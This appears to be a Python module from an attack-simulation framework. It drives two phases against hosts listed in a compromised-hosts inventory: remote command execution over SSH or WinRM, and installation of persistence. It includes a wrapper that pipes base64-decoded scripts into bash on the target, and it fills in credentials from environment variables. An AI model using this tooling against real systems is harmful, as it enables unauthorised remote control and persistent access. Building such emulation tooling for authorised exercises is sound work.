"""P10/P11 transport selection and candidate fallback, shared across all runners."""
import json
import os
from pathlib import Path
import re
import subprocess
import sys

import persistence_actions as persistence
from reports import INCIDENT_ID, p10_output_preview, redact_environment
from scenario_model import private
from windows_actions import emit, perform as windows_command, runtime_command, timeout_value
from ssh_actions import execute as ssh_execute


def targets(env):
    protocol = env.get('MRNOBODY_PROTOCOL') or ''
    mode = env.get('MRNOBODY_PLATFORM') or ('linux' if protocol == 'ssh' else 'windows' if protocol else 'auto')
    if mode not in {'auto', 'windows', 'linux'} or protocol not in {'', 'ssh', 'winrm-http', 'winrm-https'}:
        raise ValueError('Invalid platform/protocol')
    direct = env.get('MRNOBODY_RUN_MODE') == 'standalone'
    if direct:
        if not protocol and mode == 'auto':
            raise ValueError('Direct Auto targets require an explicit transport')
        platform = 'linux' if protocol == 'ssh' or mode == 'linux' else 'windows'
        hosts = [{'ip': env.get('MRNOBODY_TARGET'), 'platform': platform}]
    else:
        inventory = Path(env.get('NORDIC_COMPROMISED_STATE', '/opt/nordic-attack/state/compromised-hosts.json'))
        if not inventory.exists():
            return []
        data = json.loads(inventory.read_text())
        if data.get('incident_id') != env['NORDIC_INCIDENT_ID']:
            raise ValueError('Access inventory belongs to another incident')
        hosts = [h for h in data.get('hosts', []) if h.get('compromised')]
    result = []
    for h in hosts:
        platform = h.get('platform') or ('windows' if h.get('access') in {'rdp', 'winrm'} else 'linux' if h.get('access') == 'ssh' else '')
        if platform not in {'windows', 'linux'} or mode != 'auto' and mode != platform:
            continue
        if env.get('MRNOBODY_TARGET') and not direct and h.get('ip') != env['MRNOBODY_TARGET']:
            continue  # An Auto override filters established access, never invents it.
        method = env.get('MRNOBODY_METHOD') or 'auto'
        if method != 'auto' and persistence.METHODS.get(method, ('',))[0] != platform:
            continue
        transport = protocol or ('ssh' if platform == 'linux' else 'winrm-http')
        if (transport == 'ssh') != (platform == 'linux'):
            if direct:
                raise ValueError('Platform/protocol mismatch')
            continue
        port = env.get('MRNOBODY_PORT') or (h.get('ssh_port') or env.get('NORDIC_SSH_PORT') or 22 if platform == 'linux' else 5986 if transport == 'winrm-https' else 5985)
        username = env.get('MRNOBODY_USERNAME') or (h.get('ssh_username') or h.get('ssh_user') or env.get('NORDIC_SSH_USERNAME') or 'ubuntu' if platform == 'linux' else h.get('rdp_username') or h.get('rdp_user') or env.get('NORDIC_RDP_USERNAME') or 'Administrator')
        if not str(port).isdigit() or not 1 <= int(port) <= 65535 or not re.fullmatch(r'[A-Za-z0-9_.@\\-]{1,128}', username):
            raise ValueError('Invalid port/username')
        result.append(dict(target=private(h.get('ip')), platform=platform, protocol=transport,
                           port=int(port), username=username))
    return result


def perform(pid, target, env, session_factory=None, ssh=None):
    ssh = framed_ssh if ssh is None else ssh
    platform = target['platform']
    env = dict(env)
    # Candidate platform determines credentials; never persisted host passwords.
    if env.get('MRNOBODY_RUN_MODE') != 'standalone':
        env['MRNOBODY_PASSWORD'] = env.get('NORDIC_SSH_PASSWORD' if platform == 'linux' else 'NORDIC_RDP_PASSWORD', '')
    limit = timeout_value(env.get('MRNOBODY_TIMEOUT') or 60)
    if pid == '10' and platform == 'windows':
        return windows_command('10', target, env, session_factory)
    source = runtime_command(env.get('MRN_POWERSHELL_SECRET', '')) if pid == '10' else persistence.script(env, platform)
    if platform == 'windows':
        # Reuse pywinrm session setup and controlled script/error handling. Fixed
        # P11 payloads contain no operator command or persisted credentials.
        result = windows_command('10', target, dict(env, MRN_POWERSHELL_SECRET=source), session_factory)
        result.pop('command', None)
        result.pop('stdout_preview', None)
        result.pop('stderr_preview', None)
        if result['result'] == 'action_error':
            result.update(result='failed', warning='persistence_action_failed_check_rights_and_target_logs')
        return result
    code, stdout, stderr = ssh(target, source, env, limit)
    # OpenSSH uses 255 for transport errors; sshpass uses 1..7. A wrapper emits
    # a fixed control trailer so a shell exit 255 is still a command error.
    marker = b'\nMRN_REMOTE_EXIT='
    if marker not in stdout[0] or not stdout[0].rstrip().endswith(b'__MRN_END__'):
        return dict(result='failed', warning='transport_error_details_omitted', execution_status='transport_auth_error')
    raw, trailer = stdout[0].rsplit(marker, 1)
    try:
        action_code = int(trailer.split(b'__MRN_END__')[0])
    except ValueError:
        return dict(result='failed', warning='invalid_worker_response')
    if code != 0:
        return dict(result='failed', warning='transport_error_details_omitted')
    result = dict(result='success' if action_code == 0 else 'skipped' if pid == '11' and action_code == 78 else 'action_error' if pid == '10' else 'failed',
                  exit_code=action_code, stdout_bytes=stdout[1], stderr_bytes=stderr[1],
                  execution_status='command_error' if action_code else 'success_with_warning' if stderr[1] else 'success',
                  warning='target_method_unsupported' if action_code == 78 and pid == '11' else 'action_failed_check_target_logs' if action_code else 'nonfatal_stderr' if stderr[1] else 'none')
    if pid == '10':
        result.update(command='custom_shell_content_omitted',
                      stdout_preview=p10_output_preview(raw if stdout[1] <= 65536 else b'x' * 65537, env),
                      stderr_preview=p10_output_preview(stderr[0], env))
    return redact_environment(result, env)


def framed_ssh(target, source, env, timeout):
    # Execute in a child Bash: exit/syntax errors cannot swallow the trailer.
    # The command and password never appear in local process arguments.
    import base64
    encoded = base64.b64encode(source.encode()).decode('ascii')
    wrapped = "set +e\nprintf '%s' '" + encoded + "' | base64 -d | bash\nr=$?\nprintf '\\nMRN_REMOTE_EXIT=%s__MRN_END__\\n' \"$r\"\nexit 0\n"
    return ssh_execute(target, wrapped, env, timeout)


def run(pid, env, invoke=subprocess.run):
    if pid not in {'10', '11'} or not INCIDENT_ID.fullmatch(env.get('NORDIC_INCIDENT_ID', '')):
        raise ValueError('Invalid phase/incident')
    base = Path(env.get('NORDIC_BASE_DIR', '/opt/nordic-attack'))
    emit(base, env, pid, 'PHASE_START', phase=pid)
    outcomes = []
    try:
        limit = timeout_value(env.get('MRNOBODY_TIMEOUT') or 60)
        if pid == '10':
            runtime_command(env.get('MRN_POWERSHELL_SECRET', ''))
        if pid == '11':
            method = env.get('MRNOBODY_METHOD') or 'auto'
            persistence.configuration(env, persistence.METHODS.get(method, ('linux',))[0])
        candidates = targets(env if pid == '11' else {k: v for k, v in env.items() if k != 'MRNOBODY_METHOD'})
        for target in candidates:
            fields = dict(platform=target['platform'], target=target['target'], username=target['username'], protocol=target['protocol'],
                          method='ssh' if target['platform'] == 'linux' else 'winrm_ntlm',
                          interpreter='bash' if target['platform'] == 'linux' else 'powershell')
            if pid == '11':
                fields.update(persistence.metadata(env, target['platform']))
            else:
                fields['mitre'] = 'T1059.004' if target['platform'] == 'linux' else 'T1059.001'
            prefix = 'WINDOWS_ACTION' if pid == '10' and target['platform'] == 'windows' else 'REMOTE_ACTION' if pid == '10' else 'PERSISTENCE_ACTION'
            emit(base, env, pid, prefix + '_START', **fields)
            try:
                child = invoke([sys.executable, str(Path(__file__).resolve()), pid, '--worker'],
                               env=dict(env, MRN_REMOTE_TARGET=json.dumps(target)),
                               capture_output=True, timeout=limit + 15, check=False)
                result = json.loads(child.stdout) if child.returncode == 0 else {}
                if not isinstance(result, dict) or result.get('result') not in {'success', 'action_error', 'skipped', 'failed'}:
                    raise ValueError('Invalid worker response')
            except subprocess.TimeoutExpired:
                result = dict(result='failed', warning='timeout_remote_action_may_still_be_running')
            except (OSError, ValueError):
                result = dict(result='failed', warning='worker_execution_failed')
            outcome = result.pop('result')
            if outcome == 'action_error' and (pid != '10' or type(result.get('exit_code')) is not int or result['exit_code'] == 0):
                outcome = 'failed'
            if outcome == 'skipped' and pid != '11':
                outcome = 'failed'
            emit(base, env, pid, prefix + '_' + {'success': 'SUCCESS', 'action_error': 'ERROR', 'skipped': 'SKIPPED', 'failed': 'FAILED'}[outcome], **{**fields, **result})
            outcomes.append('transport' if result.get('warning') == 'transport_error_details_omitted' else outcome)
            if outcome in {'success', 'action_error'}:
                break  # One compatible host; retry only candidate access failures.
            if outcome == 'failed' and outcomes[-1] != 'transport':
                break
        if not candidates:
            outcomes.append('skipped' if pid == '11' and env.get('MRNOBODY_RUN_MODE') == 'campaign' else 'failed')
            emit(base, env, pid, 'REMOTE_ACTION_SKIPPED' if outcomes[-1] == 'skipped' else 'REMOTE_ACTION_FAILED', warning='no_compatible_access_targets')
    except Exception:
        outcomes.append('failed')
        emit(base, env, pid, 'REMOTE_ACTION_FAILED', warning='invalid_or_missing_runtime_configuration')
    if 'success' in outcomes and 'failed' not in outcomes:
        emit(base, env, pid, 'PHASE_COMPLETE', phase=pid)
        return 0
    if 'action_error' in outcomes and 'failed' not in outcomes:
        emit(base, env, pid, 'PHASE_SKIPPED', phase=pid, execution_status='command_error', reason='Custom_remote_command_failed')
        return 79
    if outcomes and set(outcomes) == {'skipped'}:
        emit(base, env, pid, 'PHASE_SKIPPED', phase=pid, reason='No_supported_persistence_target_or_method')
        return 78
    emit(base, env, pid, 'PHASE_FAILED', phase=pid)
    return 1


def worker(pid, env):
    try:
        target = json.loads(env['MRN_REMOTE_TARGET'])
        return perform(pid, target, env, ssh=framed_ssh)
    except subprocess.TimeoutExpired:
        return dict(result='failed', warning='timeout_remote_action_may_still_be_running')
    except (ImportError, ValueError, KeyError, TypeError, FileNotFoundError):
        return dict(result='failed', warning='invalid_or_missing_runtime_configuration')
    except Exception:
        # Transport exceptions can echo commands/passwords. Never log them.
        return dict(result='failed', warning='transport_error_details_omitted')


if __name__ == '__main__':
    phase = sys.argv[1]
    if '--worker' in sys.argv:
        print(json.dumps(worker(phase, os.environ)))
    else:
        raise SystemExit(run(phase, os.environ))
